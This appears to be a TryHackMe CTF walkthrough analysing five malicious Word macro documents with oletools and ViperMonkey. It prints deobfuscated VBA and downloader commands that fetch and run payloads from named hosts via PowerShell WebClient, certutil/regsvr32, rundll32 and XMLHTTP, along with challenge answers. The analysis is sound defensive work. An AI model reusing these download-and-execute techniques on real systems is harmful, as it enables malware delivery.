---
title: "THM: Squid Game"
date: 2025-01-21
categories: [CTF, Blue Team]
tags: [CTF, Blue Team]
permalink: /posts/ctf-blueteam-squid-game
image:
  path: /assets/img/thumbnails/ctf-blueteam-squid-game.png
---



### **Walkthrough**

#### **CTF Platform**: TryHackMe  
#### **Level**: Hard 

#### **Tools Used**: 
- olemeta  
- oletimes  
- oleid  
- oledump.py  
- vipermonkey

#### **Resources Used:**: 
- Squid Game: [TryHackMe](https://tryhackme.com/room/squidgameroom)



## **Steps for the CTF**

---

### **Attacker 1**  

#### **Document Metadata Analysis**  
We start by analyzing the metadata of the malicious document (`attacker1.doc`) using `olemeta` and `oletimes`. This provides valuable information such as the document title, author, and timestamps that can assist in attribution and threat hunting. However, keep in mind that metadata can be spoofed, so it should not be taken at face value.

```bash
parrot@parrot:~$ olemeta attacker1.doc
FILE: attacker1.doc
Properties from the SummaryInformation stream:
+---------------------+------------------------------+
|Property             |Value                         |
+---------------------+------------------------------+
|codepage             |1251                          |
|title                |Networked multi-state         |
|                     |projection                    |
|subject              |West Virginia  Samanta        |
...snip...
```

**Observations:**  
- **Q6:** Find the phone number in the maldoc. *(Answer based on metadata extraction.)*  
- **Q8:** Provide the subject for this maldoc: `West Virginia Samanta`.  
- **Q9:** Provide the time when this document was last saved. *(Cross-reference between `olemeta` and `oletimes` outputs. Note the 30-second discrepancy.)*

---

#### **Macros Analysis**  
Next, we confirm the presence of macros and assess their potential maliciousness using `oleid`. The tool identifies suspicious keywords and confirms the presence of VBA macros.

```bash
parrot@parrot:~$ oleid attacker1.doc 
Filename: attacker1.doc
...snip...
--------------------+--------------------+----------+--------------------------
VBA Macros          |Yes, suspicious     |HIGH      |This file contains VBA    
                    |                    |          |macros. Suspicious        
                    |                    |          |keywords were found. Use  
                    |                    |          |olevba and mraptor for    
                    |                    |          |more info.                
--------------------+--------------------+----------+--------------------------
...snip...
```

To locate the macros within the document, we use `oledump.py`, which identifies streams containing macros (marked with an "M").

```bash
parrot@parrot:~$ oledump.py attacker1.doc 
...snip...
  7:        41 'Macros/PROJECTwm'
  8: M    9852 'Macros/VBA/ThisDocument'
  9:      5460 'Macros/VBA/_VBA_PROJECT'
...snip...
```

**Observations:**  
- **Q7:** Doing some static analysis, provide the type of maldoc this is under the keyword “AutoOpen”: `AutoExec`.  
- **Q10:** Provide the stream number that contains a macro: `8`.  
- **Q11:** Provide the name of the stream that contains a macro: `Macros/VBA/ThisDocument`.

---

#### **Deobfuscation Using ViperMonkey**  
The extracted macro code is heavily obfuscated. To simplify analysis, we use `vipermonkey` to emulate the macro's execution and deobfuscate its logic.

```bash
parrot@parrot:~$ vmonkey -s attacker1.doc
```

After deobfuscation, the macro's core functionality becomes clearer:

```vb
Sub AutoOpen()
On Error Resume Next
  Set shapeHandle = Shapes("h9mkae7")
  VBA.Shell# "CmD /C " Replace(shapeHandle.AlternativeText + "", "[", "A") , 0
End Sub
```

**Explanation:**  
The macro retrieves the `AlternativeText` property of a Shape object named "h9mkae7" and replaces all instances of "[" with "A". The resulting string is passed to `cmd.exe` via `VBA.Shell`.

Using `oledump.py` with an ad-hoc YARA rule, we extract the command stored in the Shape object's alt text:

```bash
parrot@parrot:~$ oledump.py -y "#s#h9mkae7" attacker1_2.doc 
  1:       114 '\x01CompObj'
  2:      4096 '\x05DocumentSummaryInformation'
  3:      4096 '\x05SummaryInformation'
  4:     13859 '1Table'
               YARA rule: string
...snip...
```

Extracting strings from stream 4 reveals the encoded PowerShell command:

```bash
parrot@parrot:~$ oledump.py -s 4 -S attacker1_2.doc
h9mkae7
P^O^W^E^R^S^H^E^L^L ^-^N^o^P^r^o^f^i^l^e^ -^E^x^e^cutionPolicy B^^^yp^ass -encodedcommand J[Bp[G4[cwB0[GE[bgBj[GU[I[[9[C[[WwBT[Hk[cwB0[GU[bQ[u[...
...snip...
```

---

#### **Code Analysis**  
The decoded PowerShell script performs the following actions:

1. **WebClient Creation:**  
   Creates an instance of `WebClient` to make HTTP requests.

2. **C2 Communication:**  
   Downloads additional payloads from attacker-controlled domains and IPs.

3. **Executable Dropping:**  
   Saves a downloaded executable to `C:\ProgramData\QdZGP.exe`.

4. **Execution via COM Object:**  
   Executes the dropped executable using the `ShellBrowserWindow` COM object.

**Observations:**  
- **Q1:** What is the malicious C2 domain you found in the maldoc where an executable download was attempted? *(Answer based on analysis.)*  
- **Q2:** What executable file is the maldoc trying to drop? `QdZGP.exe`.  
- **Q3:** In what folder is it dropping the malicious executable? `C:\ProgramData`.  
- **Q4:** Provide the name of the COM object the maldoc is trying to access. `ShellBrowserWindow`.  
- **Q5:** Include the malicious IP and the PHP extension found in the maldoc. *(Answer based on analysis.)*



---

### **Attacker 2**  

#### **Identifying Macros**  
We begin by analyzing the malicious document (`attacker2.doc`) using `oleid`, `olevba`, and `oledump`. These tools help us identify and assess the macros embedded within the document.

```bash
parrot@parrot:~$ oleid attacker2.doc
...snip...
Filename: attacker2.doc
--------------------+--------------------+----------+--------------------------
Indicator           |Value               |Risk      |Description               
--------------------+--------------------+----------+--------------------------
...snip...
VBA Macros          |Yes, suspicious     |HIGH      |This file contains VBA    
                    |                    |          |macros. Suspicious        
                    |                    |          |keywords were found. Use  
                    |                    |          |olevba and mraptor for    
                    |                    |          |more info.                
--------------------+--------------------+----------+--------------------------
```

Using `olevba`, we extract additional details about the potentially malicious activities performed by the macros:

```bash
parrot@parrot:~$ olevba attacker2.doc
...snip...
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |UserForm_Click      |Runs when the file is opened and ActiveX     
|          |                    |objects trigger events                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Binary              |May read or write a binary file (if combined |
|          |                    |with Open)                                   |
|Suspicious|Shell               |May run an executable file or a system       
|          |                    |command                                      |
|Suspicious|wscript.shell       |May run an executable file or a system       
|          |                    |command                                      |
...snip...
```

To locate the streams containing macros, we use `oledump.py`:

```bash
parrot@parrot:~$ oledump.py attacker2.doc 
...snip...
  9:      2220 'Macros/Form/o'
 10:       566 'Macros/PROJECT'
 11:        92 'Macros/PROJECTwm'
 12: M    6655 'Macros/VBA/Form'
 13: M   15671 'Macros/VBA/Module1'
 14: M    1593 'Macros/VBA/ThisDocument'
 15:     42465 'Macros/VBA/_VBA_PROJECT'
 16: M    2724 'Macros/VBA/bxh'
...snip...
```

**Observations:**  
- **Q1:** Provide the streams (numbers) that contain macros: `12, 13, 14, 16`.  
- **Q2:** Provide the size (bytes) of the compiled code for the second stream that contains a macro: `15671`.  
- **Q3:** Provide the largest number of bytes found while analyzing the streams: `42465`.  
- **Q12:** Under what stream did the main malicious script use to retrieve DLLs from the C2 domains? (Provide the name of the stream): `Macros/Form/o`.

---

#### **Initial Macro Analysis**  
We export the discovered macros using `oledump.py` with the `-s` flag. Streams 12 and 13 contain long, seemingly legitimate functions for validating email addresses and handling MP3 files, which may serve as distractions for analysts. Stream 14 contains the entry point with the `AutoOpen()` subroutine, which calls `bxh.eFile`.

```bash
parrot@parrot:~$ oledump.py -s 14 -v attacker2.doc
Sub AutoOpen()
    bxh.eFile
End Sub
```

The `eFile` subroutine is located in stream 16:

```vb
Attribute VB_Name = "bxh"
Sub eFile()
    Dim QQ1 As Object
    Set QQ1 = New Form
    RO = StrReverse("\ataDmargorP\:C")
    ROI = RO + StrReverse("sbv.nip")
    ii = StrReverse("")
    Ne = StrReverse("IZOIZIMIZI")
    WW = QQ1.t2.Caption
    MyFile = FreeFile
    Open ROI For Output As #MyFile
    Print #MyFile, WW
    Close #MyFile
    fun = Shell(StrReverse("sbv.nip\ataDmargorP\:C exe.tpircsc k/ dmc"), Chr(48))
    End
End Sub
```

After deobfuscation, the macro's functionality becomes clearer:

```vb
Sub eFile()
    Dim formHandle As Object
    Set formHandle = New Form
    directory = "C:\ProgramData\"
    fileLocation = directory + "pin.vbs"
    formCaption = formHandle.t2.Caption
    MyFile = FreeFile
    Open fileLocation For Output As #MyFile
    Print #MyFile, formCaption
    Close #MyFile
    fun = Shell("cmd /k cscript.exe C:\ProgramData\pin.vbs", 0)
    End
End Sub
```

The macro extracts the `Caption` text from a form object named "t2" and writes it to `C:\ProgramData\pin.vbs`. It then uses `cmd.exe` to execute the script via `cscript.exe`.

**Observations:**  
- **Q4:** Find the command located in the ‘fun’ field: `cmd /k cscript.exe C:\ProgramData\pin.vbs`.

---

#### **Code Analysis**  
The extracted Visual Basic script (`pin.vbs`) performs the following actions:

1. **Initial Delay:**  
   The script waits for 4 seconds before proceeding. The purpose of this delay is unclear, as no prior actions are required to complete.

   ```vb
   WAITPLZ = DateAdd('s', 4, Now())
   Do Until (Now() > WAITPLZ)
   Loop
   ```

2. **Downloading DLLs:**  
   The script defines five obfuscated PowerShell commands (`LL1` through `LL5`) that download `.dll` files from attacker-controlled domains and save them to `C:\ProgramData`.

   ```powershell
   $FOOX = '(New-Object Net.WebClient).DownloadFile(''https://priyacareers.com/u9hDQN9Yy7g/pt.html'',''C:\ProgramData\www1.dll'')';
   IEX $FOOX | IEX;
   ```

3. **Executing DLLs:**  
   The script creates a `WScript.Shell` object to execute the downloaded `.dll` files using `rundll32.exe`.

   ```vb
   Set Shell = CreateObject("wscript.shell")
   Shell.Run "powershell" + LL1, 0
   Shell.Run "powershell" + LL2, 0
   ```

   After ensuring all downloads are complete, the script executes the `.dll` files:

   ```vb
   OK1 = "cmd /c rundll32.exe C:\ProgramData\www1.dll,ldr"
   Ran.Run OK1, 0
   OK2 = "cmd /c rundll32.exe C:\ProgramData\www2.dll,ldr"
   Ran.Run OK2, 0
   ```

**Observations:**  
- **Q5:** Provide the first domain found in the maldoc: `priyacareers.com`.  
- **Q6:** Provide the second domain found in the maldoc: *(Answer based on analysis.)*  
- **Q7:** Provide the name of the first malicious DLL it retrieves from the C2 server: `www1.dll`.  
- **Q8:** How many DLLs does the maldoc retrieve from the domains? `5`.  
- **Q9:** Provide the path of where the malicious DLLs are getting dropped onto: `C:\ProgramData`.  
- **Q10:** What program is it using to run DLLs? `rundll32.exe`.  
- **Q11:** How many seconds does the function in the maldoc sleep for to fully execute the malicious DLLs? `4`.



---

### **Attacker 3**  

#### **Identifying Macros**  
Following the patterns observed in Attacker 1 and Attacker 2, we can assume that `attacker3.doc` is a `.doc` file containing malicious VBA macros. Running `oleid` confirms the presence of suspicious VBA macros:

```bash
parrot@parrot:~$ oleid attacker3.doc 
...snip...
--------------------+--------------------+----------+--------------------------
VBA Macros          |Yes, suspicious     |HIGH      |This file contains VBA    
                    |                    |          |macros. Suspicious        
                    |                    |          |keywords were found. Use  
                    |                    |          |olevba and mraptor for    
                    |                    |          |more info.                
...snip...
```

Using `oledump.py`, we identify the streams containing macros (marked with "M"):

```bash
parrot@parrot:~$ oledump.py attacker3.doc 
A: word/vbaProject.bin
 A1:       423 'PROJECT'
 A2:        53 'PROJECTwm'
 A3: M    2017 'VBA/T'
 A4: m    1127 'VBA/ThisDocument'
 A5:      2976 'VBA/_VBA_PROJECT'
 A6:      1864 'VBA/__SRP_0'
 A7:       190 'VBA/__SRP_1'
 A8:       348 'VBA/__SRP_2'
 A9:       106 'VBA/__SRP_3'
A10: M    1291 'VBA/d'
A11:       723 'VBA/dir'
```

**Observations:**  
Streams `A3`, `A4`, and `A10` contain likely malicious code. Stream `A4` defines generic variables, while `A3` and `A10` contain the core malicious logic. Since the `autoopen()` subroutine is located in `A3`, we begin our analysis there.

---

#### **Manual Analysis of Stream A3**  
Stream `A3` contains the following VBA code:

```vb
Sub autoopen()
    LG = h("12%2%...snip...%77")

    Dim XN As New WshShell
    Call XN.run("cmd /c set u=tutil&&call copy C:\Windows\System32\cer%u%.exe C:\ProgramData\1.exe", 0)
    Call XN.run(LG, 0)
End Sub
```

After cleaning up the code manually, we get a clearer understanding of its functionality:

```vb
Sub autoopen()
    decoded_command = decodeFunction("LONG-ENCODED-STRING")
    Dim shellInstance as New WshShell
    Call shellInstance.run("cmd /c copy C:\Windows\System32\certutil.exe C:\ProgramData\1.exe", 0)
    Call shellInstance.run(decoded_command, 0)
End Sub
```

**Step-by-Step Breakdown:**  
1. **Decoding the Command:**  
   The macro passes an encoded string to the function `h`, which decodes it. We will analyze the decoding logic later in Stream `A10`.

2. **Creating a Shell Instance:**  
   A new `WshShell` instance is created to execute commands on the host.

3. **Copying Certutil:**  
   The macro uses `cmd.exe` to copy `C:\Windows\System32\certutil.exe` to `C:\ProgramData\1.exe`. Certutil is a legitimate Windows utility commonly abused by malware for making HTTP requests.

4. **Executing the Decoded Command:**  
   The decoded command is executed using the same `WshShell` instance. The `0` at the end of the `Shell.run` call hides the terminal window, reducing the likelihood of detection.

---

#### **Manual Analysis of Stream A10**  
Stream `A10` contains the decoding function `h` and another unused function `vY`:

```vb
Function h(ju)
    eR = Split(ju, "%")
    For lc = 0 To UBound(eR)
        hh = hh & Chr(eR(lc) Xor 111)
        Next lc
        h = hh
End Function

Function vY()
    vY = "util"
End Function
```

The `h` function performs a basic XOR decryption. It splits the encoded string by `%`, XORs each character with the key `111`, and concatenates the results. Implementing this logic in Python allows us to decode the command:

```python
CIPHER = "12%2%11%79%64%12%79%77%28%10%..."
KEY = 111

cipher_chars = CIPHER.split('%')
plain = ''.join([chr(int(c) ^ KEY) for c in cipher_chars])
print(plain)
```

The decoded command is:

```cmd
cmd /c "set u=url&&call C:\ProgramData\1.exe /%u%^c^a^c^h^e^ /f^ hxxp://8cfayv.com/bolb/jaent.php?l=liut6.cab C:\ProgramData\1.tmp && call regsvr32 C:\ProgramData\1.tmp"
```

After cleaning it up:

```cmd
cmd /c C:\ProgramData\1.exe /urlcache /f hxxp://8cfayv.com/bolb/jaent.php?l=liut6.cab C:\ProgramData\1.tmp && call regsvr32 C:\ProgramData\1.tmp
```

**Explanation:**  
- The macro calls `cmd.exe` to execute the copied `certutil.exe` (`C:\ProgramData\1.exe`) with the `/urlcache /f` flags. This makes `certutil` download a file from the attacker-controlled domain and save it as `C:\ProgramData\1.tmp`.
- The downloaded file is then executed using `regsvr32`, another legitimate Windows utility commonly abused by malware.

---

#### **Observations**  
- **Q1:** Provide the executable name being downloaded: `1.tmp`.  
- **Q2:** What program is used to run the executable? `regsvr32`.  
- **Q3:** Provide the malicious URI included in the maldoc that was used to download the binary: `hxxp://8cfayv.com/bolb/jaent.php?l=liut6.cab`.  
- **Q4:** What folder does the binary get dropped in? `C:\ProgramData`.  
- **Q5:** Which stream executes the binary that was downloaded? `Stream A3`.



---

### **Attacker 4**  

#### **Identifying Macros**  
Following the patterns observed in previous attackers, we begin by confirming the presence of malicious VBA macros in `attacker4.doc` using `oleid`:

```bash
parrot@parrot:~$ oleid attacker4.doc 
...snip...
--------------------+--------------------+----------+--------------------------
VBA Macros          |Yes, suspicious     |HIGH      |This file contains VBA    
                    |                    |          |macros. Suspicious        
                    |                    |          |keywords were found. Use  
                    |                    |          |olevba and mraptor for    
                    |                    |          |more info.                
...snip...
```

Using `oledump.py`, we identify the streams containing macros (marked with "M"):

```bash
parrot@parrot:~$ oledump.py attacker4.doc 
...snip...
  6:        41 'Macros/PROJECTwm'
  7: M   17216 'Macros/VBA/ThisDocument'
  8:     10917 'Macros/VBA/_VBA_PROJECT'
...snip...
```

The macro code is extracted from stream 7:

```bash
parrot@parrot:~$ oledump.py -s 7 -v attacker4.doc
```

The result is 283 lines of heavily obfuscated VBA code. While `vipermonkey` can automate deobfuscation, we'll manually analyze the code to better understand its functionality.

---

#### **Manual Deobfuscation**  
The obfuscated code employs four basic techniques to obscure its behavior:

1. **One-liner If ... Then End Statements:**  
   These contain impossible conditions (e.g., `If 128918 = 128918 + 1 Then End`).

2. **Multi-line If ... Then Statements:**  
   These also contain impossible conditions (e.g., `If 3264 < 68 Then`).

3. **GoTo Statements:**  
   These jump to a label on the very next line, effectively doing nothing (e.g., `GoTo zlbrmdtmprviueydvnhzltntlvfofmkntrjatbzfuxavnqxeasqawcqlnddunpozvflosmyvmvfrlwvkcw:zlbrmdtmprviueydvnhzltntlvfofmkntrjatbzfuxavnqxeasqawcqlnddunpozvflosmyvmvfrlwvkcw:`).

4. **Random Variable Names:**  
   Variables like `Dim bOYvqTVCQck As String` make the code harder to read.

The first step in manual deobfuscation is to remove all non-functional code, including impossible `If` statements and useless `GoTo` statements. After renaming variables based on their likely purpose, the 283-line script is reduced to 67 lines of cleaner code.

---

#### **Manual Analysis**  
The cleaned-up code reveals the following logic:

**Entry Point:**  
The `AutoOpen()` subroutine immediately calls the `IOWZJGNTSGK` function:

```vb
Sub IOWZJGNTSGK()
    gGHBkj = XORI(Hextostring("1C3B2404757F5B2826593D3F00277E102A7F1E3C7F16263E5A2A2811"), Hextostring("744F50"))
    ZUWSBYDOTWV gGHBkj, Environ(XORI(Hextostring("3E200501"), Hextostring("6A654851714A64"))) & XORI(Hextostring("11371B0A00123918220E001668143516"), Hextostring("4D734243414671"))
End Sub
```

After decoding the strings using the `Hextostring` and `XORI` functions, the code simplifies to:

```vb
Sub IOWZJGNTSGK()
    domain = "hxxp://gv-roth.de/js/bin.exe"
    ZUWSBYDOTWV domain, Environ("TEMP") & "\DYIATHUQLCW.exe"
End Sub
```

**Explanation:**  
- The macro passes an attacker-controlled domain (`hxxp://gv-roth.de/js/bin.exe`) and a file location (`%USER%\AppData\Local\Temp\DYIATHUQLCW.exe`) to the `ZUWSBYDOTWV` function.
- `Environ("TEMP")` resolves to `%USER%\AppData\Local\Temp` in Windows 10.

---

#### **Decoding Strings**  
The `Hextostring` and `XORI` functions are rewritten in Python for easier decoding:

```python
def hextostring(hx: str) -> bytes:
    hex_chars = [hx[i:i+2] for i in range(0, len(hx), 2)]
    return b''.join([chr(int(hc, 16)).encode() for hc in hex_chars])

def xor(cipher: bytes, key: bytes) -> None:
    return ''.join([chr(int(b) ^ int(key[i % len(key)])) for i,b in enumerate(cipher)])

cipher = ""  # Add ciphertext
key = ""  # Add key

print(xor(hextostring(cipher), hextostring(key)))
```

Using this approach, the `ZUWSBYDOTWV` function is cleaned up further:

```vb
Function ZUWSBYDOTWV(ByVal domain As String, ByVal executableFileLocation As String) As Boolean
    Dim xmlHttpClient As Object, fileHandle As Long, responseBody() As Byte

    Set xmlHttpClient = CreateObject("MSXML2.XMLHTTP")

    xmlHttpClient.Open "GET", domain, False
    xmlHttpClient.Send "gVHBnk"

    responseBody = xmlHttpClient.responseBody

    fileHandle = FreeFile
    Open executableFileLocation For Binary As #fileHandle
    Put #fileHandle, , responseBody
    Close #fileHandle

    Set hBBkbmop6VHJL = CreateObject("Shell.Application")
    hBBkbmop6VHJL.Open Environ("TEMP") & "\DYIATHUQLCW.exe"
End Function
```

**Step-by-Step Breakdown:**  
1. **HTTP Request:**  
   The macro initializes an `XmlHttp` client to send a GET request to the attacker-controlled domain (`hxxp://gv-roth.de/js/bin.exe`).

2. **Saving the Response:**  
   The response body is written to a file at `%USER%\AppData\Local\Temp\DYIATHUQLCW.exe`.

3. **Executing the File:**  
   The downloaded executable is executed using `Shell.Application.Open`.

---

#### **Observations**  
- **Q1:** What is the malicious C2 domain you found in the maldoc? `hxxp://gv-roth.de/js/bin.exe`.  
- **Q2:** What executable file is the maldoc trying to drop? `DYIATHUQLCW.exe`.  
- **Q3:** In what folder is it dropping the malicious executable? `%USER%\AppData\Local\Temp`.  
- **Q4:** Provide the name of the COM object the maldoc is trying to access. `Shell.Application`.




---

### **Attacker 5**  

#### **Question 1: What is the caption you found in the maldoc?**  
We begin by identifying streams containing macros using `oledump.py`. To extract all strings from the document, we use the following command:

```bash
parrot@parrot:~$ oledump.py attacker5.doc -s a -S
```

This outputs numerous strings. To narrow down the search, we filter for the term "caption" using `grep`:

```bash
parrot@parrot:~$ oledump.py attacker5.doc -s a -S | grep -i caption
```

The filtered output will reveal the caption string.

---

#### **Question 2: What is the XOR decimal value found in the decoded-base64 script?**  
To locate the base64-encoded script, we emulate the VBA macros using `vipermonkey`:

```bash
parrot@parrot:~$ vmonkey attacker5.doc
```

`vipermonkey` identifies a base64-encoded string. We decode this string using **CyberChef**:
1. Add the **Decode Base64** action.
2. Add the **Remove Null Bytes** action.

If the output still contains obfuscated content, look for additional base64 encoding or compression. For example:
- If the script contains a call to `FromBase64String`, copy the encoded string and decode it again in CyberChef.
- If the script mentions `New-Object IO.Compression.GzipStream`, add the **Gunzip** action to decompress the data.

Once fully decoded, search the output for the term "xor" to find the XOR decimal value.

---

#### **Question 3: Provide the C2 IP address of the Cobalt Strike server**  
After decoding the script in CyberChef, observe any remaining base64-encoded text. Copy this text into a new CyberChef window and:
1. Decode the base64 string.
2. Apply an XOR operation using the decimal value identified in Question 2.

The resulting output will contain legible information, including the C2 IP address.

---

#### **Question 4: Provide the full user-agent found**  
The user-agent string will be visible in the output obtained during the previous step. Simply copy the user-agent string from the decoded script.

---

#### **Question 5: Provide the path value for the Cobalt Strike shellcode**  
Save the decoded shellcode from CyberChef to a file (e.g., `download.dat`). Use `scdbgc` to analyze the shellcode:

```bash
parrot@parrot:~$ scdbgc -f ~/Downloads/download.dat -s -1
```

The output will include details about the shellcode's behavior, including paths. Identify the relevant path values from the output.

---

#### **Question 6: Provide the port number of the Cobalt Strike C2 Server**  
In the output generated by `scdbgc`, look for the port number associated with the C2 server's IP address.

---

#### **Question 7: Provide the first two APIs found**  
Examine the `scdbgc` output for the first two API calls made by the shellcode. These will typically appear near the beginning of the execution trace.
